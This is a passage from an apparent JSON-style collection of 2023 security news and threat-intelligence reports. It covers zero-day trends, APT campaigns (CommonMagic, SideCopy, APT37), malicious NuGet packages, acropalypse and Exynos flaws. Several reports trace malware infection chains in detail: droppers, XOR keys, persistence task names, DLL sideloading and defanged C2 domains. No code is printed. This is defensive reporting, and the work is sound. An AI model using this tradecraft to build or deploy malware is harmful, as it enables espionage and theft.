Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " An analysis of data associated with zero-day attacks in 2022 suggests that threat actors are increasingly probing for security weaknesses in edge-infrastructure technologies, including VPNs, firewalls, and IT management products.Researchers from Mandiant tracked a total of 55 zero-day vulnerabilities that adversaries exploited in various malicious campaigns last year and found that 10 of them involved an Internet-facing edge device.Among them were CVE-2022-1040 and CVE-2022-3236 in Sophos firewalls, CVE-2022-20821 in Cisco IOS, CVE-2022-42474 and CVE-2022-41226 in Fortinet's FortiOS, CVE-2022-288810 in Zoho ManageEngine, and CVE-2022-35247 in SolarWinds Serv-u.Casey Charrier, Mandiant senior analyst at Google Cloud, says adversaries are focusing on edge technologies likely because they perceive enterprise organizations as having fewer capabilities around endpoint detection and response (EDR) than they have around network monitoring.\"That's definitely an element that we assess is a focus of Chinese threat groups right now,\" Charrier says. \"As more organizations integrate Internet of Things (IoT) devices into their environment, they'll need to take this into consideration when evaluating security tools and the security of these devices.\"As has been the case for some time now, Chinese state-sponsored threat groups exploited more zero-days in 2022 than any other threat group. Of the 13 zero-days that Mandiant was able to identify as likely exploited by a state-backed group, seven — or more than half — involved a Chinese advanced persistent threat (APT) group.Since 2019, zero-day exploit activity involving ransomware groups has been increasing, says Charrier. \"This is the case for a variety of reasons,\" Charrier notes. \"For one, ransomware, as a proportion of all financially motivated activity, has continued to grow and take over the criminal ecosystem. Second, it can be more obfuscated in terms of tracking the money as well as tracking any sort of victim payments.\"Microsoft, Google, and Apple topped the charts — as they always have — in terms of the number of zero-day vulnerabilities in their respective products. The three vendors together accounted for 37 of the 55 zero-days that Mandiant tracked last year. Fifteen of the zero-days in operating systems affected Windows and nine out of 11 browser zero-days were in Google Chrome.At the same time, the number of zero-days that threat actors found and exploited in other technologies grew as well. As zero-day numbers increase, so do the number of vendors that are victims, Charrier says: \"While the top three targeted vendors remain consistent, the variety of additional targeted vendors generally continues to expand and vary each year.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Although the initial vector of compromise is unclear, the details of the next stage imply the use of spear phishing or similar methods. The victims navigated to a URL pointing to a ZIP archive hosted on a malicious web server. The archive, in turn, contained two files:Malicious ZIP archiveDecoy Word document (subject: Results of the State Duma elections in the Republic of Crimea)Decoy PDF with reference to a malicious shortcut file (subject: information about DPR Ministry of Finance Decree No. 176)The ZIP files were downloaded from various locations hosted on two domains: webservice-srv[.]online and webservice-srv1[.]onlineKnown attachment names, redacted to remove personal information:When the potential victim activates the LNK file included in the ZIP file, it triggers a chain of events that lead to the infection of the computer with a previously unseen malicious framework that we named CommonMagic. The malware and techniques used in this campaign are not particularly sophisticated, but are effective, and the code has no direct relation to any known campaigns.Infection chainInstallation workflowThe malicious LNK points to a remotely hosted malicious MSI file that is downloaded and started by the Windows Installer executable.\nThe MSI file is effectively a dropper package, containing an encrypted next-stage payload (service_pack.dat), a dropper script (runservice_pack.vbs) and a decoy document that is supposed to be displayed to the victim.Files contained in attachment.msiThe encrypted payload and the decoy document are written to the folder named %APPDATA%\\WinEventCom. The VBS dropper script is, in turn, a wrapper for launching an embedded PowerShell script that decrypts the next stage using a simple one-byte XOR, launches it and deletes it from disk.Decryption of service_pack.dat The next-stage script finalizes the installation: it opens the decoy document to display it to the user, writes two files named config and manutil.vbs to %APPDATA%\\WinEventCom, and creates a Task Scheduler job named WindowsActiveXTaskTrigger, to execute the wscript.exe%APPDATA%\\WinEventCom\\manutil.vbs command every day.The script manutil.vbs, which is dropped by the initial package, is a loader for a previously unknown backdoor written in PowerShell that we named PowerMagic. The main body of the backdoor is read from the file %APPDATA%\\WinEventCom\\config and decrypted with a simple XOR (key: 0x10).Snippet of PowerMagic’s code containing the “powermagic” stringWhen started, the backdoor creates a mutex – WinEventCom. Then, it enters an infinite loop communicating with its C&C server, receiving commands and uploading results in response. It uses OneDrive and Dropbox folders as transport, and OAuth refresh tokens as credentials.Every minute the backdoor performs the following actions:As it turned out, PowerMagic was not the only malicious toolkit used by the actor. All the victims of PowerMagic were also infected with a more complicated, previously unseen, modular malicious framework that we named CommonMagic. This framework was deployed after initial infection with the PowerShell backdoor, leading us to believe that CommonMagic is deployed via PowerMagic.The CommonMagic framework consists of several executable modules, all stored in the directory C:\\ProgramData\\CommonCommand. Modules start as standalone executable files and communicate via named pipes. There are dedicated modules for interaction with the C&C server, encryption and decryption of the C&C traffic and various malicious actions.The diagram below illustrates the architecture of the framework.Framework architectureA dedicated heartbeat thread updates the remote file <victim ID>/S/S.txt every five minutes with the local timestamp of the victim.Then, in separate threads, the network communication module downloads new executable modules from the directory <victim ID>/M and uploads the results of their execution to the directory <victim ID>/R.The data exchanged with the operator via the OneDrive location is encrypted using the RC5Simple open-source library. By default, this library uses the seven-byte sequence “RC5SIMP” at the beginning of the encrypted sequence, but the developers of the backdoor changed it to “Hwo7X8p”. Encryption is implemented in a separate process, communicating over the pipes named \\\\.\\pipe\\PipeMd and \\\\.\\pipe\\PipeCrDtMd.So far, we have discovered two plugins implementing the malicious business logic. They are located in the directory C:\\ProgramData\\CommonCommand\\Other.So far, we have found no direct links between the samples and data used in this campaign and any previously known actors. However, the campaign is still active, and our investigation continues. So, we believe that further discoveries may reveal additional information about this malware and the threat actor behind it.Distribution servers\nwebservice-srv[.]online\nwebservice-srv1[.]online\n185.166.217[.]184AuthorsBad magic: new APT found in the area of Russo-Ukrainian conflictYour email address will not be published.

      "title": "Cyble — Notorious SideCopy APT group sets sights on India's DRDO",
      "text": " SideCopy APT is a Threat Actor(TA) from Pakistan that has been active since 2019, focusing on targeting South Asian nations, especially India and Afghanistan. The SideCopy APT gets its name from the infection chain, which imitates that of the SideWinder APT. Some reports suggest that this actor shares characteristics with Transparent Tribe (APT36) and could potentially be a sub-group of that threat actor.DRDO is a government agency tasked with researching and developing advanced technologies for use by the Indian Armed Forces. Its focus includes creating cutting-edge defense systems such as missiles, radars, electronic warfare and communication systems, naval and aerospace systems. The agency plays a significant role in India’s defense industry, contributing to the country’s military strength and self-sufficiency in defense technology.The initial infection starts with a spam email containing the link to the malicious file hosted on the compromised website. The link allows users to download a ZIP file containing a LNK file named “DRDO – K4 Missile Clean room.pptx.lnk” from the below URL:The delivery mechanism of the SideCopy APT attack via a spam email is illustrated in the figure below.The infection process begins with the user extracting a zip file and then running the .lnk file on their machine.Once the .lnk file is executed, it triggers a command that launches “mshta.exe” to connect to a specific URL, shown in the figure below.After redirection, the URL eventually establishes a connection with the following URL:Subsequently, the hta file is downloaded and executed in the path mentioned below:The figure below displays a code snippet from the “pantomime.hta” file, including the compressed Microsoft PowerPoint file encoded in Base64 format.After execution, the hta file decodes and decompresses the PPT file encoded in Base64 format. Consequently, it saves the decompressed Microsoft PowerPoint file in the “%temp%” folder under the name “DRDO – K4 Missile Clean room.pptx” and launches it, as shown in Figure 4.  The TAs are enticing users with a DRDO PowerPoint document and covertly engaging in malicious activities in the background through the “pantomime.hta” file.The hta file, aside from dropping the PPT file, carries out a concatenation operation and decodes the Base64-encoded content of the DLL file named, “hta.dll”. When the decoding is complete, the DLL file is loaded into memory and triggered using the DynamicInvoke method. This method creates an instance of a class called “WorkInProgress”.Upon execution, the “hta.dll” file drops another .hta file named “jquery.hta” under the directory “C:\\ProgramData\\HP” and executes it through “mshta.exe”.When executed, the “jquery.hta” file carries out the concatenation operation and decodes the Base64-encoded content of the loader DLL file named “PreBotHta.dll”, as it did before for “hta.dll”. Once decoded, the “PreBotHta.dll” file is loaded into the memory and invoked using the DynamicInvoke method. This method creates an instance of a class called “DraftingPad.”It also uses a WMI query, specifically “Select * From AntiVirus,” to gather the names of installed antivirus products.The below figure shows the code snippet of “jquery.hta” file.Finally, the “jquery.hta” file executes the PinkAgain() function of the loader “PreBotHta.dll” file, passing AntiVirus names and a Base64 encoded payload called “DUser.dll” as arguments.The below figure shows the code snippet of the loaded “PreBotHta.dll” file.The PinkAgain() function has code to copy the legitimate and essential “credwiz.exe” file, which is a part of the Windows operating system, and copies it to the following location as “cridviz.exe”. The legitimate file “credwiz.exe” is primarily used to create and restore Windows user account credentials backups. Typically, it loads a legitimate file named “Duser.dll.”However, in this case, the malware takes Base64 encoded argument, decodes it, and saves it as “Duser.dll” in the location where “cridviz.exe” was dropped previously.  The dropped malicious file “Duser.dll” is a variant of the Action Rat Malware family responsible for performing malicious activities in the victim’s machine. During its execution, the loader drops both files in the below directory.Furthermore, the loader utilizes various directories to drop the files “credwiz.exe” and “DUser.dll” using different names based on the type of AntiVirus software installed on the victim’s machine. TAs commonly use the tactic to increase the effectiveness of their attacks and avoid detection by security software.The specific directories and filenames used by the loader, as indicated below.Once the necessary files have been dropped onto the victim’s system, the “cridviz.exe” process is initiated, which then proceeds to sideload the malicious payload “Duser.dll”, as shown in the figure below.To begin its malicious operation, the RAT first gathers information about the victim’s machine, such as its hostname, username, operating system version, and installed antivirus products. This data is then transmitted to the Command-and-Control(C&C) server via HTTP request, as below.Afterward, the malicious process enters a loop and remains idle until it receives commands from the server, which it executes. The RAT possesses the ability to perform any of the following operations upon receiving commands from the C&C:In addition, the loader DLL was utilized to deploy a recently developed information-stealing malware called AuTo Stealer. This malware can gather PDF documents, Office/text/database files, and images and transmit the stolen information via HTTP or TCP.This loader DLL file also drops a batch file named “test.bat” in the %temp% directory, which creates an auto startup entry for the “cridviz.exe” file using the “reg.exe” utility, as shown in the figure below.Figure 9 – Run entry for PersistenceSideCopy is an APT group that emulates the tactics of the Sidewinder APT to distribute its own malware. Its attack patterns typically involve the use of malicious LNK files to initiate a complex chain of infection using multiple HTAs and loader DLLs, ultimately leading to the deployment of final payloads. This group has been observed to target government and military officials in India and Afghanistan specifically. The APT group continuously evolves its techniques while incorporating new tools into its arsenal.CRIL continues to monitor the most recent APT attacks, phishing attacks, or malware strains in circulation and regularly publishes informative blog posts with practical insights to help protect users from these well-known attacks.We have listed some essential cybersecurity best practices that create the first line of control against attackers.

This threat actor has been very active in February and March 2023 targeting individuals in various South Korean organizations.During our threat hunting research, we came across a GitHub repository which is owned by a member of the threat actor group. Due to an operational security (OpSec) failure of the threat actor, we were able to access a wealth of information about the malicious files used by this APT group along with the timeline of their activities dating as far back as October 2020.The large number of samples we identified through the attacker's GitHub repository are not present on OSINT sources such as VirusTotal either. This allowed us to get more insights into this threat actor's previously undocumented attack vectors, motives, targets and the themes used.In this blog, we will provide a high-level technical analysis of the infection chain, the new loaders we identified and a detailed analysis of the themes used by this APT group, discovered while reviewing the GitHub commit history. Even though the threat actor routinely deletes the files from the repository, we were able to retrieve all the deleted files and do an analysis of them.\n\r\n There are multiple attack vectors used by APT37 in this campaign. Figure 1 and Figure 2 show 2 examples of the attack-chain. The other attack vectors we have described in the \"Recent TTPs\" section.\n\nFigure 1: attack-chain using CHM file format to kick start the infection chain\n\n\nFigure 2: attack-chain using the MS Office Excel add-in to kick start the infection chain\n\r\n Our initial discovery was the GitHub repository of APT37 which was used to stage several malicious payloads. Figure 3 shows a preview of the threat actor's GitHub repository\nFigure 3: GitHub account of the threat actorThe contents of the Readme file are chosen to appear as an Android software related repository. At the end of the Readme file, we noticed a base64-encoded string, preceded by a tagWhile reviewing the commit history, we noticed that the threat actor often updates this encoded string. While we were not able to identify the exact usage of this encoded string, we believe it will be fetched by a payload on the endpoint.\n\r\nFigure 4 shows a GitHub commit where the threat actor is updating the encoded token.\nFigure 4: GitHub commit which shows threat actor updating the encoded token in the READMEWhen we reviewed the commit history of the GitHub repository, we noticed that the threat actor frequently deleted malicious files from it. Figure 5 shows commit logs related to the delete events.\n\nFigure 5: GitHub commit history showing the files being deleted routinely by the threat actorWe traced this commit history all the way to its origin, and observed that the first commit happened in October 2020. This was surprising to us since the threat actor was able to maintain a GitHub repository, frequently staging malicious payloads for more than 2 years without being detected or taken down.\n\r\nFigure 6 shows the first commit in the commit history logs.\nFigure 6: First commit in the GitHub account. Activity started in October 2020Our next step was to retrieve all the deleted files from the GitHub repository. We have included the list of hashes and the original filenames in the indicators of compromise (IOCs) section.This wealth of information retrieved from the GitHub repository gave us a lot of insight into the types of themes used by the threat actor as social engineering lures and we were able to make an educated guess about the potential targets of the campaign.Per our analysis of the file names, and the decoy contents, we have summarized the themes below along with examples. This is not an exhaustive list\n\r\n ThemeFilenameCommentsGeopolitical[INSS] National Security and Strategy (Winter 2022).rarSouth Korean companiesLG유플러스_이동통신_202207_이_선.rar\n\r\n\t\t\tSamsungLife.rarThemes related to popular South Korean companies - LG and SamsungAcademic institutesfinal exam questions 2022 summer  KED.rar\n\r\n\t\t\t2022 후기 신-편입생 모집요강.rarExam questions related to Korean Economic Development (KED)\n\r\n\t\t\tRelated to University of North Korean studiesFinance (income tax, general insurance)WooriCard_20220401.rar\n\r\n\t\t\tBoanMail.rarWooriCard is a popular financial services organization in South Korea\n\r\n\t\t\tHanwha general insurance is a major insurer in South Korea\r\n We have included below a few decoy themes used by the threat actor. These are samples not yet documented in the public domain. So, we hope to share more insights into the themes used in the campaign through this information.Figure 7 shows a decoy file related to INSS (Institute of National Security Strategy) in South Korea. This decoy PDF was sent along with a CHM file inside the archive file with the name: [INSS] National Security and Strategy (Winter 2022).rar\nFigure 7: Decoy related to geopolitics themeFigure 8 shows a decoy file related to examination questions on the topic of Korean Economic Development\nFigure 8: decoy related to education themeFigure 9 shows a decoy file related to the Hanwha General Insurance - a major insurer in South Korea. This decoy file was sent along with the CHM file in an archive file - BoanMail.rar\n\nFigure 9: decoy related to finance theme It is well-known that APT37 uses a Chinotto PowerShell-based backdoor which is deployed on the endpoint through a malicious Windows help file (CHM). These CHM files are distributed inside archive files. Most of these archive files contain two components - the malicious CHM file and the decoy file to be displayed to the victim.In most cases, the decoy files are password-protected. The password to open the decoy file is displayed by the CHM file.Figure 10 below shows an example of code inside the CHM file which is responsible for displaying the decoy file to the victim, downloading a malicious HTA file from the attacker's server and executing it.\nFigure 10: code inside the CHM file used to launch MSHTA and download HTASo far in most of the campaigns of APT37 deploying Chinotto PowerShell backdoor, they have leveraged CHM files distributed inside archive files.Interestingly, on March 15th 2023, around the time of our investigation, the threat actor uploaded a malicious Microsoft Excel Add-in to the GitHub repository. This Add-in is an XLL file. XLL files are DLLs which function as an add-in for the Microsoft Excel application.We haven't seen this attack vector used by APT37 before and we believe this to be the first case being documented.For the purpose of technical analysis, we will use the XLL file with MD5 hash: 82d58de096f53e4df84d6f67975a8ddaXLL files get activated when they are loaded by the MS Excel application. There are various callback functions provided by Microsoft which allow the XLL file to communicate with the Excel application. One of the most common functions is xlAutoOpen() which is called as soon as the DLL is loaded and activated by the MS excel application.Figure 11 below shows the code present in the XLL file in our case.\nFigure 11: xlAutoOpen() subroutine of the malicious MS Office Excel add-inBelow are the main steps performed by this XLL file.This HTA file contains the PowerShell backdoor called ChinottoUltimately, we see that the goal of this XLL file is also to deploy the Chinotto PowerShell backdoor. However, instead of using the CHM file, it now uses the XLL file.We recovered some LNK files from the GitHub repository which were uploaded in August 2022 and apparently used in in-the-wild attacks around the same timeframe. These LNK files were present inside RAR archives. Along with the LNK file, an HTML file was present masquerading as a sign-in page of the South Korean company - LG.The two LNK files we observed, both used dual extensions - \"html.lnk\" and \"pdf.lnk\".These LNK files were used to execute MSHTA and download the malicious HTA file from the attacker's server. Rest of the attack-chain is similar to other cases which finally leads to the Chinotto PowerShell-based backdoor.We analyzed the metadata of the LNK file with LECmd tool and noticed that both the LNK files were generated on a Virtual Machine running VMWare and with a Mac address of: 00:0c:29:41:1b:1cSince the threat actor reused the same Virtual Machine to generate multiple payloads, this information could be useful for threat hunting and threat attribution purposes in future.Figure 12 and 13 show the outputs of LECmd tool highlighting the target command executed by the LNK and other important metadata\nFigure 12: LNK target command line and metadata extracted using LECmdFigure 13: LNK machine details extracted using LECmdFigure 14 shows the decoy HTML file which is packaged along with the LNK file inside the same archive.Filename: LG유플러스_이동통신_202208_이_선.html\r\nTranslation: U+_Mobile_Communication_202208_Lee_Seon.html\nFigure 14: decoy file related to LGIn March 2022, a macro-based MS office Word file was uploaded to the GitHub repository. This macro would launch MSHTA to download the PowerShell-based Chinotto backdoor as well. The target URL from where the HTA file is fetched is also the same as the previous case. This shows that the threat actor uses multiple initial file formats and attack vectors to deploy the same backdoor.Filename: NEW(주)엠에스북스 사업자등록증.doc\r\nFilename translation: NEW MS Books Business Registration Certificate.docFigure 15 shows the relevant VBA macro code.\nFigure 15: VBA macro used to launch MSHTA to download the malicious HTA fileAnother attack vector used by APT37 to deploy Chinotto PowerShell-based backdoor on the endpoint is using HWP files with embedded OLE objects. These OLE objects contain a malicious PE32 binary which executes MSHTA to download a PowerShell-based backdoor from the C2 server.When viewed with Hancom Office, the embedded OLE objects take the form of a clickable element in the document's body.APT37 makes use of misleading bait images to entice the user to click on the OLE object elements, an action required to cause the execution of the malicious PE payloads inside these objects.Figure 16 shows an example of such a document, as it appears in Hancom Office.\n\nFigure 16: Malicious HWP document by APT37. The Korean-language dialog is fake - it’s in fact an OLE object represented by a static image of a dialog. When it’s clicked, a real dialog pops up - prompting the user to confirm the execution of the payload.Rest of the attack-chain is similar to the previous cases.For the purpose of technical analysis, we will consider the HWP file with MD5 hash: a4706737645582e1b5f71a462dd01140Filename: 3. 개인정보보완서약서_북주협.hwp\r\nTranslated filename: 3.

It is constantly updating its tactics, techniques and procedures as is evident from the multiple file types used in the initial stages by it. The themes used by this threat actor range from geopolitics, current events, education to finance and insurance.It is also particularly interested in current events and activities related to the Korean peninsula.We will continue monitoring the activities of this threat actor and ensure our customers are protected against APT37.\n\r\n MD5 hashArchive

      "text": "  Russia's war with Ukraine has triggered a surge in ideologically motivated hacktivism that persists to this day, posing by far the most significant impact on the cyber threat landscape for financial services, according to a report by the Financial Services Information Sharing and Analysis Center.Many of these attacks are relatively low impact, but they underscore how the internet has helped to transform modern geopolitical conflicts into a participatory exercise for hackers around the world with strong political sympathies.  \"Financial firms in countries that Russia considers hostile have been singled out for attacks and called out by name as targets on Telegram and other hacktivist forums,\" the report noted. \"While the attacks have yet to cause significant impact, they are notable in their ability to temporarily disrupt major businesses and governments while also garnering media interest.\"   FS-ISAC expects to see more hacktivist attacks for ideological reasons carried out this year as other conflicts heat up. Besides the Russia-Ukraine conflict, the intensified relationship between China and Taiwan and Iran's ideologically driven attacks on the Western financial sector could also drive an increase in cyber and reputational risk to financial institutions caught in the crosshairs.  The report also highlights how other major cyber threats, like ransomware, are evolving into more sophisticated forms. Ransomware-as-a-service (RaaS) growth offers ransomware gangs \"a better business model than ever,\" and continues to pose a significant threat to financial organizations, despite a reported decline in ransomware payments.  Teresa Walsh, FS-ISAC's global head of intelligence, told SC Media there are multiple drivers behind the drop in payments, but also general agreement that it's not because ransomware is slowing down.\"Ransomware payments have decreased due to a combination of factors, including regulatory and law enforcement pressure, sanctions, and changes to cyber insurance policies. However, almost all security vendors agree that ransomware attacks are getting worse, spurring the growth of other monetization avenues besides direct payment, such as selling exfiltrated data on the dark web,\" said Walsh.Cryptocurrency, a dominant form of ransomware payments, should be closely monitored, especially as it is expected to become more integrated into financial infrastructure this year, Walsh added.  FS-ISAC's chief executive officer Steven Silberstein said that the best tool for financial institutions to defend against elevated cyber risks is intelligence sharing and collaboration across the global industry. \"Cyber threats often evolve faster than the tools we use to combat them, but our strength is in our community,\" said Silberstein.  Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

      "text": " A baker's dozen of packages hosted on the NuGet repository for .NET software developers are actually malicious Trojan components that will compromise the installation system and download crypto-stealing malware with backdoor functionality.Software supply chain security firm JFrog stated in an analysis published March 21 that the 13 packages, which have since been removed, have been downloaded more than 166,000 times and impersonate other legitimate software, such as Coinbase and Microsoft ASP.NET. JFrog detected the attack when the company's researchers noted suspicious activity when a file — init.ps1 — executed upon installation and then downloaded an executable file and ran it.The discovery of the malicious code highlights that attackers are further branching out into the software supply chain as a way to compromise unwary developers, even though .NET and the C# programming languages are lesser known among attackers, says Shachar Menashe, director of security research for JFrog.\"The techniques to get malicious code executed on NuGet package install, while trivial, are less documented than in Python or JavaScript, and some of them have been deprecated, so some novice attackers may think it's not possible,\" he says. \"And perhaps NuGet has better automated filtering of malicious packages.\"The attack underscores that typosquatting continues to be a problem. That style of attack involves creating packages with similar sounding names — or the same name with common spelling errors — as legitimate ones, in the hopes that a user will mistype a common package or won't notice the errors.\"Even though no prior malicious-code attacks were observed in the NuGet repository, we were able to find evidence for at least one recent campaign using methods such as typosquatting to propagate malicious code,\" they wrote. \"As with other repositories, safety measures should be taken at every step of the software development lifecycle to ensure the software supply chain remains secure.\"Files that are automatically executed by development tools are a security weakness and should be eliminated or limited to reduce the attack surface area, the researchers stated. That functionality is a significant reason why the npm and PyPI ecosystems have poisoning issues, as compared to, say, the Go package ecosystem.\"Despite the fact that the discovered malicious packages have since been removed from NuGet, .NET developers are still at high risk from malicious code since NuGet packages still contain facilities to run code immediately upon package installation,\" the JFrog researchers stated in the blog post. \"[A]lthough it is deprecated, [an initialization] script is still honored by Visual Studio and will run without any warning when installing a NuGet package.\"JFrog advised developers to check for typos in imported and installed packages and said that developers should make sure not to \"accidentally install them in their project, or mention them as a dependency,\" the company stated.In addition, developers should view the contents of packages to ensure that there are no executable files that are being downloaded and automatically executed. While such files are common in some software ecosystems, they are usually an indication of malicious intent.Through a variety of countermeasures, the NuGet repository — as well as npm and PyPI — are slowly, but surely, eliminating the security weaknesses, says JFrog's Menashe. \"I don't expect NuGet to become more of a target in the future, especially if the NuGet maintainers were to fully remove support for running code on package install — which they have already partially done,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A severe privacy flaw named 'acropalypse' has also been found to affect the Windows Snipping Tool, allowing people to partially recover content that was edited out of an image.This flaw poses a significant privacy concern as if a user shares a picture, such as a credit card with a redacted number or revealing photos with the face removed, it may be possible to partially recover the original photo.Today, software engineer Chris Blume confirmed that the ‘acropalypse’ privacy flaw also affects the Windows 11 Snipping Tool.When opening a file in the Windows 11 Snipping Tool and overwriting an existing file, instead of truncating any unused data, it leaves the unused data behind, allowing it to be partially recovered.To test this, we opened an existing PNG file in the Windows 11 Snipping Tool, cropped it (can also edit or mark it up), and then saved the changes to the original file. The original and cropped images are illustrated below.While the cropped image now contains far less data than the original one, the file sizes for the original image file (office-screenshot-original.png) and cropped image file (office-screenshot.png) are the same, as seen below.For example, below is the original screenshot that I took of Microsoft's site. As you can see, the file ends with an IEND and contains no data after it.However, using the Windows 11 Snipping Tool to overwrite the original image with the cropped version, the program did not correctly truncate the unused data, and it remains after the IEND data chunk.Opening the file in an image viewer just displays the cropped image, as anything after the first IEND is ignored.However, this untruncated data can be used to partially recreate the original image, potentially allowing sensitive portions to be revealed.Using this script, BleepingComputer successfully recovered a portion of the image, as shown below.This was not a complete recovery of the original image, and you may be wondering why this is a privacy risk.Imagine that you took a screenshot of a sensitive spreadsheet, confidential documents, or even a nude picture, and cropped out sensitive information or parts of the image.Even if you can't fully recover the original image, someone could recover sensitive information you would not want to go public.It should also be noted that not all PNG files, such as optimized PNGs, are affected by this flaw.\"Your original PNG was saved with a single zlib block (common for \"optimised\" PNGs) but actual screenshots are saved with multiple zlib blocks (which my exploit requires),\" Buchanan explained to BleepingComputer.BleepingComputer also found that if you open an untruncated PNG file in an image editor, such as Photoshop, and save it to another file, the unused data at the end will be stripped off, making it no longer recoverable.Finally, the Windows 11 Snipping Tool also performs the same behavior with JPG files, leaving data untruncated if overwritten. However, Buchanan told BleepingComputer that his exploit does not currently work on JPGs, but could be possible.Microsoft told BleepingComputer that they are aware of the reports and are looking into them.\"We are aware of these reports and are investigating. We will take action as needed to help keep customers protected,\" a Microsoft spokesperson told BleepingComputer."

      "text": " Security researchers have discovered attacks from an advanced threat actor that used “a previously unseen malicious framework” called CommonMagic and a new backdoor called PowerMagic.Both malware pieces have been used since at least September 2021 in operations that continue to this day and target organizations in the administrative, agriculture, and transportation sectors for espionage purposes.Researchers at cybersecurity company Kaspersky say that the hackers are interested in collecting data from victims in Donetsk, Lugansk, and Crimea.Once inside the victim network, the attackers behind the CommonMagic espionage campaign can use separate plugins to steal documents and files (DOC, DOCX, XLS, XLSX, RTF, ODT, ODS, ZIP, RAR, TXT, PDF) from USB devices.The researchers believe that the initial infection vector is spear phishing or a similar method to deliver a URL pointing to a ZIP archive with a malicious LNK file.A decoy document (PDF, XLSX, DOCX) in the archive diverted the target user from the malicious activity that started in the background when the LNK file disguised as a PDF was launched.Kaspersky says that activating the malicious LNK would lead to infecting the system with a previously unknown PowerShell-based backdoor that the researcher named PowerMagic after a string in the malware code.The backdoor communicates with the command and control (C2) server to receive instructions and upload the results using OneDrive and Dropbox folders.Following the PowerMagic infection, the targets were infected with CommonMagic, a collection of malicious tools that the researchers have not seen before these attacks.The CommonMagic framework has several modules that start as standalone executables and use named pipes to communicate.The malware or the methods seen in CommonMagic attacks are not complex or innovative. An infection chain involving malicious LNK files in ZIP archives has been observed with multiple threat actors.Despite the non-customary approach, though, CommonMagic's method proved to be successful, Kaspersky says.The researchers discovered an active infection in October last year but tracked a few attacks from this threat actor as old as September 2021.Although CommonMagic activity appears to have started in 2021, Besverzhenko says that the adversary intensified their efforts last year and continues to be active today.By combining unsophisticated techniques that have been used by multiple actors and original malicious code, the hackers managed to make impossible a connection to other campaigns at this time.A spokesperson from Kaspersky told BleepingComputer that “the limited victimology and Russian-Ukrainian conflict-themed lures suggest that the attackers likely have a specific interest in the geopolitical situation in that region.”"

      "text": " A group monitored as REF2924 by Elastic Security Labs is wielding novel data-stealing malware — an HTTP listener written in C# dubbed Naplistener by the researchers — in attacks against victims operating in southern and southeast Asia.So, don't sleep on that defense-in-depth strategy.Researchers observed Naplistener in the form of a new executable that was created and installed on a victim network as a Windows Service on Jan. 20. Threat actors created the executable, Wmdtc.exe, using a naming convention similar to the legitimate binary used by the Microsoft Distributed Transaction Coordinator service.Naplistener is the latest in a series of new types of custom malware that Elastic researchers have observed REF2924 using in its attacks that support a particular focus on evading network-based detection, King says. What these new malware families all have in common is not only that they are based on open source technologies but also that they use familiar and legitimate network assets to mask their activities.\"A consistent theme to all these capabilities is the intention to hide in legitimate and expected forms of network communication, and [they] are installed to resemble the underlying services they abuse,\" King notes.While other threat groups also adopt these approaches with custom malware, they do so \"less often, and less consistently\" than REF2924, he notes, demonstrating that REF2924 is betting heavily on avoiding detection for success.\"A unique observation of this threat actor is in the deep focus of evasion tactics,\" King says. \"While many threats masquerade in similar ways, this threat pursues the methodology to an extreme and consistently uses these methodologies.\"\"Organizations in the observed regions of impact who rely strictly on network-based methods of detection will struggle to identify these malware families,\" he adds.Specifically, Naplistener creates an HTTP request listener that can process incoming requests from the Internet, read any data that was submitted, decode it from Base64 format, and execute it in memory, the researchers said.As mentioned, it evades victims' attempts at network-based detection by behaving similarly to Web servers, operating between legitimate Web users and resembling normal Web traffic. It does this all without generating Web server log events, the researchers said.Naplistener also relies on code present in public repositories for a variety of purposes, and it appears that REF2924 may be developing additional prototypes and production-quality code from open sources, they added.Because REF2024 is so focused on avoiding network-based detection methods, enterprises in its crosshairs can avoid compromise by the group primarily by prioritizing endpoint-based detection technologies, more commonly known as endpoint detection and response (EDR), King says.Indeed, while EDR is not a new security strategy for many organizations in the US, in the region of the world where the group is operating, it is still in early stages of adoption, he says. This exposes these organizations to risk from the custom malware that the group is deploying.\"Organizations which rely on network technologies to detect threats will face significant challenges, and those are compounded relative to the complexity of their networks,\" King says. \"In short: The more connections and types of connections, the harder it is for organizations to monitor them effectively; this is relatively quickly addressed with another host-based form of visibility.\"Another technology that organizations can deploy to combat malware that can evade network-based detection is egress filtering, or limiting the kinds of outbound network communications they permit, King says.However, he adds, \"this is not a particularly scalable approach once an organization reaches a significant size, due to the large number of egress points they manage and the diversity of legitimate communication methods.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A newly disclosed set of vulnerabilities in Samsung chipsets has exposed millions of Android mobile phone users to potential remote code execution (RCE) attacks, until their individual device vendors make patches available for the flaws.Until then, the best bet for users who want to protect against the threat is to turn off Wi-Fi calling and Voice-over-LTE settings on their devices, according to the researchers from Google's Project Zero who discovered the flaws.In a blog post last week, the researchers said they had reported as many as 18 vulnerabilities to Samsung in the company's Exynos chipsets, used in multiple mobile phone models from Samsung, Vivo, and Google. Affected devices include Samsung Galaxy S22, M33, M13, M12, A71, and A53, Vivo S16, S15, S6, X70, X60, and X30, and Google's Pixel 6 and Pixel 7 series of devices.Four of the vulnerabilities in the Samsung Exynos chipsets give attackers a way to completely compromise an affected device, with no user interaction needed and requiring the attacker to only know the victim's phone number, Project Zero threat researcher Tim Willis wrote.The security researcher identified the remaining 14 vulnerabilities in Samsung Exynos chipsets as being somewhat less severe.In the past, device vendors have taken their time addressing vulnerabilities in the Android ecosystem. So, if that's any indication, users affected by the vulnerabilities in the Samsung chipset could be in for a long wait. \"The easy part is fixing the hardware flaws with new software,\" says Ted Miracco, CEO at Approov. \"The harder part is getting manufacturers to push the updates to the end users and getting end users to update their devices,\" he says. Unfortunately, many users of the chipsets may not be quick to patch the devices and users are probably largely unaware if the vulnerabilities, he says.Vulnerabilities like the ones Project Zero discovered in the Samsung chipsets exist not only in the Android ecosystem, but in the iOS ecosystem and any complex supply chain involving sophisticated hardware and software as well, Miracco continues. The challenge is reducing the time from detecting flaws to deploying solutions on all devices. \"This is an area where the Android ecosystem needs to put a lot attention, as updates can be few and far between with many manufacturers of mobile devices,\" he says. Enterprises could mandate that users who bring their own devices (BYOD) to work must utilize devices from approved 